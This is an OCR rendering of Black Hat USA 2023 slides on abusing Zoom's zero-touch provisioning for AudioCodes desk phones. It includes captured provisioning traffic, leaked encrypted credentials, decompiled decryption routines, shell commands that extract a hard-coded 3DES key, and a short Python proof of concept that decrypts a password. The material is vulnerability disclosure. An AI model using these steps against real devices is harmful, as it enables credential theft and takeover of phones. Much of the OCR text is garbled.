---
title: "Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones"
speakers: ["Moritz Abrell"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf"
pages: 148
sha256: "2bf1ee277468c9d8b6a8de131e46b4645454abcc2cd9e07893ada9359d83acb3"
text_chars: 53527
ocr_pages: 115
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:21:26Z"
---
# Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones

**Speakers:** Moritz Abrell  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Moritz Abrell_Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones.pdf` (148 pages)


## Slide 1

Zero-Touch-Pwn Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones

Speaker:

Moritz Abrell, SySS GmbH

#BHUSA @BlackHatEvents

## Slide 2

## About this Talk

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
About this Talk
=0/ root) - aw
B)
oy
```

## Slide 3

## Who am I?

#### Moritz Abrell

@moritz_abrell

#### Senior IT Security Consultant

SySS GmbH

Hacking Hard- and Software

Various national and international Hacking and InfoSec Conferences

#BHUSA @BlackHatEvents

## Slide 4

## Motivation

#BHUSA @BlackHatEvents

## Slide 5

## On-Premise (traditional)

malicious  sensitive
configuration data…

Configuration Server

Phone

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
On-Premise (traditional)
+,
Ww
malicious aaa sensitive
a "~~
1008 ---O
=,
(a
Phone Configuration Server
```

## Slide 6

## Motivation

- Traditional endpoint provisioning is not secure e.g.:

   - Accessible sensitive Information

   - Insufficient or missing authentication

   - Missing transport encryption

   - Missing server/client verification

- Combining traditional devices with cloud communication services?

#BHUSA @BlackHatEvents

## Slide 7

## Motivation

- Traditional endpoint provisioning is not secure e.g.:

   - Accessible sensitive Information

   - Insufficient or missing authentication

   - Missing transport encryption

   - Missing server/client verification

- Combining traditional devices with cloud communication services?

- Huge potential impact

#BHUSA @BlackHatEvents

## Slide 8

## Why Zoom?

#BHUSA @BlackHatEvents

## Slide 9

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 10

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 11

## Why Zoom?

Source: https://support.zoom.us/hc/en-us/articles/360033223411-Getting-started-with-provisioning-desk-phones

#BHUSA @BlackHatEvents

## Slide 12

Source: https://support.zoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Supported-Devices #BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Zoom Phone Certified Hardware
Last Updated: June 15, 2023
The table below provides the list of supported phone devices for Zoom Phone. You can also see a list of supported features.
Before you add devices to Zoom Phone, see an overview of the provisioning process.
For Zoom Phone Appliances, see our list of certified devices.
For Zoom Certified Devices, see the list of Zoom Certified Devices.
This article covers:
e Encryption
e Desk phones
e AudioCodes
« Cisco
e Grandstream
e Check the hardware version number of your Grandstream desk phone
« Poly
e Yealink
e Analog gateways
e AudioCodes
e Cisco
e Grandstream
e Upgrade an ATA Grandstream firmware
e Verify an ATA Grandstream unit has the updated Gen 2 device factory certificate installed
e Find an ATA Grandstream LAN MAC address value
e Poly
e Desk phone accessories
e Cisco
e Poly
e Yealink
e Session Border Controllers
e AudioCodes
Source: https://supportzoom.us/hc/en-us/articles/360001299063-Zoom-Phone-Supported-Devices
#BHUSA @BlackHatEvents
```

## Slide 13

#BHUSA @BlackHatEvents

Source: https://blog.zoom.us/millions-of-reasons-to-celebrate-zoom-phone/

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2023
5 Reasons Zoom Phone Has Sold 4
Million Seats So Quickly
September 9, 2022 - 8 min read
Source: https://blog.zoom.us/millions-of-reasons-to-celebrate-zoom-phone/
```

## Slide 14

## Hardware

- AudioCodes C450HD IP-Phone

- Publicly downloadable firmware

- Support for ZTP

- Multiple use cases

#BHUSA @BlackHatEvents

## Slide 15

Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Desk-Phones-and-Devices

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
@ Provisioning DeskPhone: x | + v -
€ C _@ support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Desk-Phones-and-Device <* oO
Zoom Support Products — Solutions Resources Plans & Pricing Joiny Hosty Signin
Product Support» Supportby Topic~ MoreSupport~ Contact Support Q Search
Zoom Support > em Support > Settings and Configuration for Zoom Phone > Provisioning Desk Phones and Devices
Provisioning Desk Phones and Devices
Provision phones and hardware to use them with Zoom Phone. Use desk phone provision templates and other provisioning guides to perform
advanced provisioning configurations.
AudioCodes MP504/508 (formally MS5OOLi) ATA device Configuring desk phone provision templates
provisioning Assisted provisioning URLs
Cisco assisted provisioning guide Poly assisted provisioning guide
Zoom Phone firmware resync and Auto Pulling Yealink assisted provisioning guide
Resetting to factory default (Poly) Re-syncing a desk phone or common area phone with the zero
Resetting to factory default (Yealink) touch provisioning (ZTP) server
Source: https://support.zoom.us/hc/en-us/sections/4413424119565-Provisioning-Desk-Phones-and-Devices
```

## Slide 16

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 17

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 18

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
desk phone the provisioning and configuration
server for the added device
| |
Q,
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 19

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
| |
Q,
IT administrator
ZOOM ne and assigns
a configuration template
desk phone
```

## Slide 20

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
e)
```

## Slide 21

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 22

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
Q
co
IT administrator
ZOOM ne and assigns
a configuration template
```

## Slide 23

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Vendor Redirect Service
Request
Raw Hex
1 GET /@@9R8F9D8992 HTITP/1.1
2 Host: redirect. audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
Conmection: close
fs
LA
6b4/1
```

## Slide 24

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Vendor Redirect Service
Request
Raw
Hex
1 GET |/@@988F9D8992
2 Host:
fs
LA
Connection:
close
HTTP/1.1
redirect. audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.
6b4/1
```

## Slide 25

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Vendor Redirect Service
Request
Raw Hex
1 GET |/@@9R8F9D8992 |HTTP/1.1
2 Host: |redirect.audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.6@4/1
Conmection: close
fs
LA
```

## Slide 26

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Vendor Redirect Service
Response
Raw Hex Render
HTTP/1.1 302 Found
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
6 Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440T5c51b
Lu PF
fs
LA
```

## Slide 27

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Vendor Redirect Service
Response
Raw Hex Render
HTTP/ 1.1} 302 Found
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
6 Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440T5c51b
Lu PF
fs
LA
```

## Slide 28

## Vendor Redirect Service

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Vendor Redirect Service
Response
Raw Hex Render
HTTP/ 1.1} 302 Found
Content-Length: ®
Connection: close
Content-Type: text/plain; charset=utf-&8
Date: Thu, 29 Jun 2@23 @8:20:05 GMT
6/Location: https: //eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
Reguest-Context: appId=cid-vi:229bb6bda-@4d?7-408q0-b225-c6e44eT5c51b
Lu PF
fs
LA
```

## Slide 29

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Request
Raw Hex
GET /@@9@8F9D8993 HITP/1.1
Host: redirect.audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
5 Connection: close
O@(€|(>
Lil Pa
fs
Response
Raw Hex Render
HTTP/1.1 382 Found
Content-Length: 6
Connection: close
Content-Type: text/plain; charset=utf-8
5 Date: Thu, 29 Jun 2823 @8:31:18 GMT
6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
Li Pk
io
```

## Slide 30

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Request
Raw Hex
1 GET) /@@988F9D8993 HTTP/1.1
2 Host: redirect.audiocodes.com
Accept: */*
User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Connection: close
O@(€|(>
Fa La
LA
Response
Raw Hex Render
HTTP/1.1 382 Found
Content-Length: 6
Connection: close
Content-Type: text/plain; charset=utf-8
Date: Thu, 29 Jun 2823 08:31:18 GMT
6 Location: https://eu@lpbxacp.zoom.us/api/v2/pbx/provisioning/audiocodes/
7 Request-Context: appId=cid-v1:229bb6bd-04d7-408d-b225-c6e440f5c51b
Li Pk
io
LA
```

## Slide 31

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Response
Raw Hex Render
1 HTTP/1.1 302 Found
2 Content-Length: @
3 Connection: close
4 Content-Type: text/plain; charset=utTf-&
> Date: Tue, 68 Nov 2022 18:20:39 GMT
6 Location: https://SecureProvService.
7 Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44eaT5c51b
```

## Slide 32

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Response
Lu Pt
fe
LA
Date:
6 Locati
Raw
Tue,
Hex Render
HTTP/1.1 3@2 Found
Content-Length: @
Connection: close
Content-Type: text/plain: charset=utTf-&
@8 Nov 2022 16:28:39 GMT
on:| https://SecureProvService.
7 Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44eaT5c51b
```

## Slide 33

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Response
Raw Hex Render
HTTP/1.1 302 Found
Content-Length: 6
Connection: close
Content-Type: text/plain: charset=utf-&
5 Date: Fri, 13 Jan 2023 @7:58:082 GMT
6 Location: https:/ 2] firmware.
7 Request-Context: appId= cid- v1: 229bb6bd -@4d7 -408d-b225-c6e440T5c51b
Lu Ao -
fos
‘ini
```

## Slide 34

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Response
Raw Hex Render
HTTP/1.1 288 OK
Date: Tue, 68 Nov 2822 11:19:57 GMT
Server: Apache
Strict-Transport-Security: max-age=63872808; includeSubdomains; preload
Upgrade: h2
6 Connection: Upgrade, close
7 X-XSS-Protection: 1: mode=block
8 X-Content-Type-Options: nosniff
9 Content-Type: text/plain; charset=UTF-8
1@ Set-Cookie: BIGipServerPORTAL_8@=1010
Content-Length: 3352
Wom I
fs
Wo oR
:Genband_AUDC_IP_Phone_4xx_configuration_template_v2
;Special interop - Genband
Voip/services/application_server_type=GENBAND
fa
;Private Line settings
& voip/line/@/enabled=1
19 voip/line/@/auth_name=
20 voip/line/@®/auth_password=
21 voip/line/@/description=
22 voip/line/@/id=
23 voip/line/@/line_mode=PRIVATE
24 voip/line/@/account_type=SIP
```

## Slide 35

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Request
Raw Hex
GET /pub/MP202-DMS-Flash-USA.CONF HTTP/1.1
Host: redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
> Connection: close
Lu PF
fo
()f> |€|>
Response
Raw Hex
HTTP/1.1 288 OK
Content-Length: 528
Connection: close
Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
on
fo
```

## Slide 36

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
Host: redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
> Connection: close
Lu PF
fo
()f> |€|>
Response
Raw Hex
HTTP/1.1 288 OK
Content-Length: 528
Connection: close
Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
on
fo
```

## Slide 37

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
Host: | redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
Connection: close
Lu PF
fo
LA
()f> |€|>
Response
Raw Hex
1 HTTP/1.1 208 OK
2 Content-Length: 528
3 Connection: close
Content-Type: application/octet-stream
Date: Wed, 26 Oct 2022 18:59:21 GMT
fs i]
LA
```

## Slide 38

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Request
Raw Hex
GET |/pub/MP202-DMS-Flash-USA.CONF) HTTP/1.1
Host: | redirect. audiocodes.com
User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
Accept: */*
Connection: close
Lu PF
fo
LA
()f> |€|>
Response
Raw Hex
1} HTTP/1.1 208 OK
2) Content-Length: 528
3 Connection: close
4 Content-Type: application/octet-stream
5 Date: Wed, 26 Oct 2022 18:59:21 GMT
```

## Slide 39

## SYSS-2022-053

- SYSS-2022-053

- Exposure of sensitive Information to an unauthorized Actor (CWE-200)

#BHUSA @BlackHatEvents

## Slide 40

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
Response
Pretty Raw Hex
13 X-Content-Type-Options: nosnift
14 Connection: close
1s
16 ems_server/provisioning/url=https: //1ppdm. audiocodes.com/
1? provisioning/method=STATIC
18 provisioning/configuration/url=https: //1ppdm. audiocodes.com/dynamiccontfigfiles/
19 provisioning/firmware/url=https: //1ppdm. audiocodes.com/firmwaretiles/
20 ems server /user_name=system
21 ems_server/user_password={
"VvLZ0p5/5pM="
i
See ee eee
```

## Slide 41

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
$ echo "Vv1Z0p5/5pM=" | base64 -d | xxd
76;
@Q0000000: 56f9 593a 9e7f e693 =~
ViVi...
```

## Slide 42

#BHUSA @BlackHatEvents

Source: https://www.audiocodes.com/library/firmware

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
fs Firmware x | =F Fs = a
<€ Cf audiocodes.com/library/firmware & << * OF &
IP Phone Software Image Files
Click here to download the latest software image files of the AudioCodes IP Phones
Source: https://www.audiocodes.com/library/firmware
```

## Slide 43

## Password Encryption

- Imports of **_AC_Decrypt_Param_** and **_decrypt_string_** from **_/lib/libac_des3.so_**

   - _/lib/libcgi.so_

   - _/lib/libdevice_management.so_

   - _/lib/libaq201.so_

   - _/home/ipphone/bin/voip_task_SFB_

   - _/home/ipphone/bin/nxphone_

   - _/home/ipphone/bin/emsc_

   - _/home/ipphone/bin/http_services_

#BHUSA @BlackHatEvents

## Slide 44

#BHUSA @BlackHatEvents

## Slide 45

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
undefined
O0010T44 70 46
O0010T48 OG 60
00010T4c 1 408
@0010T50 02 56
a0010T54 89 fe
2d
ae
ae
ae
ff
eg
e]
el
el
eb
undefined AC_Decrypt_Param{ }
r:1 <RETURN=
stmdb sp!,{r4,r5,16,1r
cpy T6, Fé
cpy r4,rl
cpy T5,r2
bl decrypt_string
```

## Slide 46

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Oo mo
18
11
12
13
14
15
16
17
18
19
28
21
22
23
a4
oe
26
a7
28
|
31
32
33
35
37
38
39
a1
42
43
45
undefined4 decrypt_string(char *param_1,undefined4 param_2)
size_t sVarl;
int iVar2;
undefined4 uVar3:
undefined4 *puVar4:
undefined4 *puVars;
undefined4 *puVar6;
undefined auStack_182@ [2044]:
char acStack_1024 [4]:
char acStack_102@ [2048];
undefined4 local_82@ [2]:
undefined local_818 [17]:
undefined auStack_8@7 [2027]:
puVard
puVarS
do {
puVar6 = puVar5 + 2;
uVar3 = puVar5[1i];
*ouVard = *puVars;
puVar4[1] = uVar3;
puVar4 = puVard + 2:
puVars = puVar6;
} while (puVar6 != &UNK_00010Td®);
*puVard = @;
memset (auStack_807,0,@x7e7):
sVarl = strlen(param_1);
if (((sVarl < 5) || (iVar2 = strncmp(param_1,"{\"",2), iVar2 != @)) ||
(iVar2 = strncmp(param_1 + (sVari - 2),"\"}",2), iVar2 != 8)) {
uVar3 = OxffffffftT:
local_828:
BYTE_ARRAY_@@010Tb8;
}
else {
strncpy(acStack_102@,param_1 + 2,sVarl - 4);
acStack_102@[sVari - 4] = '\O';
sVarl = strlen(acStack_1028):
uVar3 = base64_decode(acStack_1020, sVari, auStack_1820):
des3_crypt(auStack_1820,param_2,uVar3,local_820,0);
uVar3 = @:
}
return uVar3;
#BHUSA @BlackHatEvents
```

## Slide 47

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
37
38
39
41
42
43
else {
strncpy(acStack_1020,param_1 + 2,sVarl - 4);
acStack_ 1@2@[sVarl - 4] = '\@':
sVarl = strlen(acStack_1020):
uVar3 = baseb4_decode(acStack_ 1020, sVarl,auStack_1820):
des3_crypt(auStack_1820, param_2,uVar3, local_820,6);
uVars = @:
r
#BHUSA @BlackHatEvents
```

## Slide 48

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
48 DES_set_key_unchecked(param_4,&D5tack
51 DES_ede3_cbc_encrypt(input,param_2,
_1a8);
49 DES_set_key_unchecked(param_4[1] ,&2DStack_128);
58 DES_set_key_unchecked(param_4[2] ,&DSta
icK_ag):
_ sire, &05tack_
8, &0S5tack_
local_ib®,param_5)
```

## Slide 49

Source: https://www.openssl.org/docs/man3.0/man3/DES_ede3_cbc_encrypt.html

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
os /docs/man3.0/man3/DE
x Tia
€ C  @ openssl.org/docs/n
1an3.0/man3/DES
void DES _ede3_cbc_encrypt(const unsigned ‘input, unsigned
long length, DE
S_key_schedule
DES key schedule 5
*kc3
*ivec, 1 enc
Source: https://www.openssl.org/docs/man3.0/man3/DES_ede3_cbc_encrypt.html
```

## Slide 50

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
5@ DES_ede3_cbc_encrypt
51 (input,output,  size,&DES_key_schedule*ks1,&DES_key_schedule*ks2,&DES_key_schedule*k
52 ,ivec,enc):
```

## Slide 51

### **IV**

### **KEY**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
IV
KEY
BYTE_ARRAY_GOG1OTbO
OGOLOTbO db [8]
G0010TbO [0] A3h, Adh,
o0010fb4 [4] 35h, CBh,
OGOLETbE db [24]
GOO1ETbS [6] 60h, 40h, 75h, FBh,
eooLETbe [4]
GooLEfcO [8]
B0G1ATc4 [12]
B08LATcB [16]
BGG1GTcc [20]
```

## Slide 52

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
# Extraction of the Key:
$ offset=$(python3 -c 'print(int("@@000fb8", base=16))')
$ dd skip=$offset count=24 if=libac_des3.so of=key.bin bs=1
# Extraction of the IV:
$ offset=$(python3 -c 'print(int("@0@00fTb@", base=16))')
$ dd skip=$offset count=8 if=libac_des3.so of=iv.bin bs=1
```

## Slide 53

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
#!/usr/bin/env python3
# -*- coding: utf-& -*-
import sys
import base64
from Crypto.Cipher import DES3
from binascii import unhexlify
KEY = unhexlify(' 604075 Fo###HHHHHHHHHEHHHHHHHEEEREPHEREHEEE EERE | )
IV unhexlify( ' a3sa4####35cb####' )
def decrypt(ciphertext):
ciphertext_decoded base64 .b64decode (ciphertext)
cipher = DES3.new(KEY, DES3.MODE_CBC, iv-IV)
plaintext cipher.decrypt(ciphertext_decoded)
print("plain text password: {}".format(plaintext.decode('utf-8')))
def main():
decrypt(sys.argv[1])
if __name__ '"__main__':
main( )
```

## Slide 54

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
$ python3 poc.py Vv1Z0p5/5pM=
plain text password: system
```

## Slide 55

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
$ python3 poc.py Vv1Z0p5/5pM=
plain text password: |system
```

## Slide 56

# **…**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Response
Lil PL
fs
LA
A
— Li Pa
pull
E
pull
JI
Raw Hex Render
HTTP/1.1 20@ OK
Date: Tue, @8 Nov 28022 11:09:13 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Referrer-Policy: no-referrer
6 Cache-Control: no-cache, no-store, max-age=@®, must-revalidate
Strict-Transport-Security: max-age=31536000; includeSubDomains
ems_server/provisioning/url=https: //ippdm. audiocodes.com:443/
ems_server/user_name= @audiocodes.com
ems_server/user_password={"nQb iw==" }
5|personal_settings/ language=English
```

## Slide 57

## SYSS-2022-052

- SYSS-2022-052

- CVE-2023-22957

- Use of hard-coded Cryptographic Key (CWE-321)

#BHUSA @BlackHatEvents

## Slide 58

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
28.1
Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» To encrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f <filename>.cfg
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 59

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» Toencrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f ———
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 60

#### AudioCodes Administrator Manual

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
28.1 Encrypting Configuration Files
This procedure describes how to encrypt the Configuration file. For example, you may wish
to encrypt the configuration file when it is send over an unsecure network.
» Toencrypt the configuration file:
@ Atthe command line prompt, specify the following:
encryption tool.exe -f ———
where <file name>.cfg specifies the name of the Configuration file that you wish to
encrypt.
Once the Configuration file is encrypted, it receives the suffix ‘.cfx’ (e.g. Conf.cfx). This
is the file that you should specify in the ‘Configuration URL’ and the ‘Dynamic
Configuration URL’ fields when performing automatic provisioning (see Part II
‘Automatic Provisioning’).
AudioCodes Administrator Manual
```

## Slide 61

## /lib/libcgi.so

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
Nibfibegi.so
if (local _ lee == 6) {
sVar2 = strlen(acStack_1e8}:
iVarl = strcmp(acStack_1leé
if (iVarl == @) {
__ format = |/home/ipphone/bin/decryption_tool
(sVar2 - 4),".cfx");
-f /tmp/back_file.cfx -o %s >
fdev/null"
```

## Slide 62

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2&0e253
> f \ /s ° ING & » > . | ‘: “
. BS
[mabrell
$ strings -n 32 decryption_tool
openssl_crypt EVP_BytesToKey ERROR cipher[%d], strlen((char*)pw) [%d]
openssl_crypt EVP_CipherInit ERROR
openssl_crypt EVP_CipherUpdate ERROR
openssl_crypt EVP_CipherFinal ERROR
des3_crypt: Cipher context can't be NULL!
des3_crypt: Input buffer can't be NULL!
des3_crypt: Output buffer can't be NULL!
init_cipher: RAND_pseudo_bytes ERROR. Can't generate random salt!
init_cipher: EVP_BytesToKey |ERROR. Can't generate key and IV!
init_cipher: EVP_CipherInit ERROR. Can't initialize cipher
Tinal_cipher: Cipher context can't be NULL!
Tinal_cipher: Output buffer can't be NULL!
Tinal_cipher EVP_CipherFinal ERROR
h4dA
Use: %s -f <input Tile name> -o <output Tile name>
Invalid command line parameters.
```

## Slide 63

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2&0e253
> f \ /s ° ING & » > . | ‘: “
. BS
[mabrell
$ strings -n 32 decryption_tool
openssl_crypt EVP_BytesToKey ERROR cipher[%d], strlen((char*)pw) [Xd]
openssl_crypt EVP_CipherInit ERROR
openssl_crypt EVP_CipherUpdate ERROR
openssl_crypt EVP_CipherFinal ERROR
des3_crypt: Cipher context can't be NULL!
des3_crypt: Input buffer can't be NULL!
des3_crypt: Output buffer can't be NULL!
